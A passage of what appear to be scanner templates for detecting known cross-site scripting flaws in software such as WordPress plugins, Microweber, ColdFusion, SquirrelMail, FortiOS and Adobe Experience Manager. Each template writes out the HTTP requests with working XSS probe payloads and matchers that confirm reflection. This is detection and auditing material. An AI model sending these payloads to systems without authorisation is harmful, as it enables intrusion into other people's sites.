POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin-ajax.php?action=get_sw_product&title=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, 'colspan=\"2\">\<script>alert(document.domain)\</script>\</th>')
- condition - and

---
# Microweber Cross-Site Scripting
## Description
- Microweber contains a reflected cross-site scripting in Packagist microweber/microweber prior to 1.2.11.
- severity - medium
- tags - cve,cve2022,microweber,xss,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. mwui_init
    2. onmousemove="alert(document.domain)
- condition - and

---
# WordPress White Label CMS \<2.2.9 - Cross-Site Scripting
## Description
- WordPress White Label CMS plugin before 2.2.9 contains a reflected cross-site scripting vulnerability. It does not sanitize and validate the wlcms[_login_custom_js] parameter before outputting it back in the response while previewing.

- severity - medium
- tags - cve,cve2022,wordpress,xss,wp-plugin,wpscan
## Requests
### Step - 1
```
POST /wp-login.php?wlcms-action=preview HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

wlcms%5B_login_custom_js%5D=alert%28%2FXSS%2F%29%3B

```
### Matchers

**Type - word**
- part - body
- words
    1. alert(/XSS/);

**Type - word**
- part - body
- words
    1. wlcms-login-wrapper

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenCATS v0.9.6 - Cross Site Scripting
## Description
- OpenCATS v0.9.6 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the email parameter in the Check Email function.

- severity - medium
- tags - cve,cve2022,xss,opencats,authenticated
## Requests
### Step - 1
```
POST /index.php?m=login&a=attemptLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>:0

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Microweber \<1.2.11 - Stored Cross-Site Scripting
## Description
- Microweber before 1.2.1 contains multiple stored cross-site scripting vulnerabilities in Shop's Other Settings, Autorespond E-mail Settings, and Payment Methods.

- severity - medium
- tags - cve,cve2022,xss,microweber,huntr
## Requests
### Step - 1
```
POST /api/user_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
POST /api/save_option HTTP/2
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: {{BaseURL}}/admin/view:shop/action:options

option_key=checkout_url&option_group=shop&option_value=%22%3E%3CiMg+SrC%3D%22x%22+oNeRRor%3D%22alert(document.domain)%3B%22%3E&module=shop%2Forders%2Fsettings%2Fother

```
### Step - 3
```
POST /module/ HTTP/2
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: {{BaseURL}}/admin/view:shop/action:options

module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-settings-admin&class=card-body+pt-3&option_group=shop%2Forders%2Fsettings%2Fother&is_system=1&style=position%3A+relative%3B

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2,"true")
    2. contains(body_3,'\">\<img src=\"x\" onerror=\"alert(document.domain);\">\" placeholder=\"Use default')
    3. contains(all_headers_3,"text/html")
    4. status_code_3==200
- condition - and

---
# Cofax \<=2.0RC3 - Cross-Site Scripting
## Description
- Cofax 2.0 RC3 and earlier contains a cross-site scripting vulnerability in search.htm which allows remote attackers to inject arbitrary web script or HTML via the searchstring parameter.
- severity - medium
- tags - cofax,xss,cve,cve2005
## Requests
- Method - GET
### URL
- {{BaseURL}}/search.htm?searchstring2=&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. '>"\</script>\<script>alert(document.domain)\</script>

---
# Adobe Coldfusion \<=8.0.1 - Cross-Site Scripting
## Description
- Adobe ColdFusion Server 8.0.1 and earlier contain multiple cross-site scripting vulnerabilities which allow remote attackers to inject arbitrary web script or HTML via (1) the startRow parameter to administrator/logviewer/searchlog.cfm, or the query string to (2) wizards/common/_logintowizard.cfm, (3) wizards/common/_authenticatewizarduser.cfm, or (4) administrator/enter.cfm.
- severity - medium
- tags - cve,cve2009,adobe,xss,coldfusion,tenable
## Requests
- Method - GET
### URL
- {{BaseURL}}/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cherokee HTTPD \<=0.5 - Cross-Site Scripting
## Description
- Cherokee HTTPD 0.5 and earlier contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via a malformed request that generates an HTTP 400 error, which is not properly handled when the error message is generated.
- severity - medium
- tags - cherokee,httpd,xss,cve,cve2006
## Requests
- Method - GET
### URL
- {{BaseURL}}/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

---
# SquirrelMail 1.4.x - Folder Name Cross-Site Scripting
## Description
- Multiple cross-site scripting (XSS) vulnerabilities in SquirrelMail 1.4.2 allow remote attackers to execute arbitrary script and possibly steal authentication information via multiple attack vectors, including the mailbox parameter in compose.php.
- severity - medium
- tags - squirrelmail,cve2004,cve,edb,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

---
# Nordex NC2  - Cross-Site Scripting
## Description
- Nordex NC2 contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - xss,iot,nordex,nc2,seclists,cve,cve2015
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/login
  - connection=basic&userName=admin%27%22%29%3B%7D%3C%2Fscript%3E%3Cscript%3Ealert%28%27{{randstr}}%27%29%3C%2Fscript%3E&pw=nordex&language=en
### Matchers

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. \</script>\<script>alert('{{randstr}}')\</script>

---
# Navis DocumentCloud \<0.1.1 - Cross-Site Scripting
## Description
- Navis DocumentCloud plugin before 0.1.1 for WordPress contains a reflected cross-site scripting vulnerability in js/window.php which allows remote attackers to inject arbitrary web script or HTML via the wpbase parameter.
- severity - medium
- tags - cve,cve2015,wordpress,wp-plugin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/navis-documentcloud/js/window.php?wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Combodo iTop \<2.2.0-2459 - Cross-Site Scripting
## Description
- Combodo iTop before 2.2.0-2459 contains a cross-site scripting vulnerability in application/dashboard.class.inc.php which allows remote attackers to inject arbitrary web script or HTML via a dashboard title.

- severity - medium
- tags - cve,cve2015,xss,itop
## Requests
- Method - GET
### URL
- {{BaseURL}}/pages/ajax.render.php?operation=render_dashboard&dashboard_id=1&layout_class=DashboardLayoutOneCol&title=%%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress Pie-Register \<2.0.19 - Cross-Site Scripting
## Description
- WordPress Pie Register before 2.0.19 contains a reflected cross-site scripting vulnerability in pie-register/pie-register.php which allows remote attackers to inject arbitrary web script or HTML via the invitaion_code parameter in a pie-register page to the default URL.
- severity - medium
- tags - cve2015,wordpress,wp-plugin,xss,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Symposium \<=15.8.1 - Cross-Site Scripting
## Description
- WordPress Symposium through 15.8.1 contains a reflected cross-site scripting vulnerability via the wp-content/plugins/wp-symposium/get_album_item.php?size parameter which allows an attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - xss,wpscan,cve,cve2015,wordpress,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wp-symposium/get_album_item.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Fortinet FortiOS \<=5.2.3 - Cross-Site Scripting
## Description
- Fortinet FortiOS 5.2.x before 5.2.3 contains a cross-site scripting vulnerability in the SSL VPN login page which allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.
- severity - medium
- tags - cve,cve2015,xss,fortigates,ssl
## Requests
- Method - GET
### URL
- {{BaseURL}}/remote/login?&err=--%3E%3Cscript%3Ealert('{{randstr}}')%3C/script%3E%3C!--&lang=en
### Matchers

**Type - word**
- words
    1. \<script>alert('{{randstr}}')\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# WordPress sourceAFRICA \<=0.1.3 - Cross-Site Scripting
## Description
- WordPress sourceAFRICA plugin version 0.1.3 contains a cross-site scripting vulnerability.
- severity - medium
- tags - wp-plugin,xss,packetstorm,cve,cve2015,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/sourceafrica/js/window.php?wpbase=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Church Admin \<0.810 - Cross-Site Scripting
## Description
- WordPress Church Admin plugin before 0.810 allows remote attackers to inject arbitrary web script or HTML via the address parameter via index.php/2015/05/21/church_admin-registration-form/.

- severity - medium
- tags - wp-plugin,wp,edb,wpscan,cve,cve2015,wordpress,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/church-admin/includes/validate.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SourceBans \<2.0 - Cross-Site Scripting
## Description
- SourceBans before 2.0 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the advSearch parameter to index.php.
- severity - medium
- tags - cve,cve2015,xss,sourcebans
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?p=banlist&advSearch=0%27%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&advType=btype
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/

---
# Magento Server Mass Importer - Cross-Site Scripting
## Description
- Magento Server Mass Importer plugin contains multiple cross-site scripting vulnerabilities which allow remote attackers to inject arbitrary web script or HTML via the (1) profile parameter to web/magmi.php or (2) QUERY_STRING to web/magmi_import_run.php.
- severity - medium
- tags - plugin,edb,packetstorm,cve,cve2015,magento,magmi,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SquirrelMail 1.2.6/1.2.7 - Cross-Site Scripting
## Description
- The Virtual Keyboard plugin for SquirrelMail 1.2.6/1.2.7 is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
- severity - medium
- tags - cve2002,edb,xss,squirrelmail,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/src/options.php?optpage=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search
- {{BaseURL}}/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search
- {{BaseURL}}/src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

---
# Jira Rainbow.Zen - Cross-Site Scripting
## Description
- Jira Rainbow.Zen contains a cross-site scripting vulnerability via Jira/secure/BrowseProject.jspa which allows remote attackers to inject arbitrary web script or HTML via the id parameter.
- severity - medium
- tags - cve,cve2007,jira,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
### Matchers

**Type - word**
- words
    1. ">\<script>alert(document.domain)\</script>

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# phpPgAdmin \<=4.1.1 - Cross-Site Scripting
## Description
- phpPgAdmin 3.5 to 4.1.1, and possibly 4.1.2, is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via certain input available in PHP_SELF in (1) redirect.php, possibly related to (2) login.php, which are different vectors than CVE-2007-2865.
- severity - medium
- tags - cve,cve2007,xss,pgadmin,phppgadmin,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test
### Matchers

**Type - word**
- words
    1. \<script>alert("document.domain")\</script>

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# DOM EventListener - Cross-Site Scripting
## Description
- EventListener contains a cross-site scripting vulnerability via the document object model (DOM). An attacker can execute arbitrary script which can then allow theft of cookie-based authentication credentials and launch of  other attacks.
- severity - info
- tags - xss,misc
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - regex**
- part - body
- regex
    1. (([\w\_]+)\.)?add[Ee]vent[Ll]istener\(["']?[\w\_]+["']?

---
# Open Akamai ARL - Cross-Site Scripting
## Description
- Open Akamai ARL contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.
- severity - high
- tags - akamai,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
### Matchers

**Type - word**
- condition - and
- words
    1. ">\<svg onload=confirm(document.domain)>
    2. Suggestions for improving the results

**Type - word**
- part - header
- words
    1. text/html

---
# XSS-Protection Header - Cross-Site Scripting
## Description
- Setting the XSS-Protection header is deprecated. Setting the header to anything other than `0` can actually introduce an XSS vulnerability.
- severity - info
- tags - xss,misconfig,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - regex**
- part - header
- regex
    1. (?i)x-xss-protection: 0
- negative - True

**Type - regex**
- part - header
- regex
    1. (?i)x-xss-protection: 1+
### Extractors

**Type - kval**
- part - header
- kval
    1. x_xss_protection

---
# postMessage - Cross-Site Scripting
## Description
- postMessage contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and therefore steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,postmessage
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - regex**
- regex
    1. postMessage\([a-zA-Z]+,["']\*["']\)

---
# Adobe Experience Manager  - Cross-Site Scripting
## Description
- Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences.
- severity - high
- tags - aem,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=\<svg/onload=confirm(document.domain);>//a
- {{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=\<svg/onload=confirm(document.domain);>//a
### Matchers

**Type - word**
- words
    1. \<svg/onload=confirm(document.domain);>
    2. A JSONObject text must begin with
- condition - and

**Type - status**
- status
    1. 400

---
# Adobe Experience Manager - Cross-Site Scripting
## Description
- Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childlist when the dispatcher does not respect the content-type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.

- severity - high
- tags - xss,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/etc/designs/xh1x.childrenlist.json//\<svg onload=alert(document.domain)>.html
### Matchers

**Type - word**
- words
    1. \<svg onload=alert(document.domain)>
    2. {"path":"/etc/designs/xh1x.childrenlist.json
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
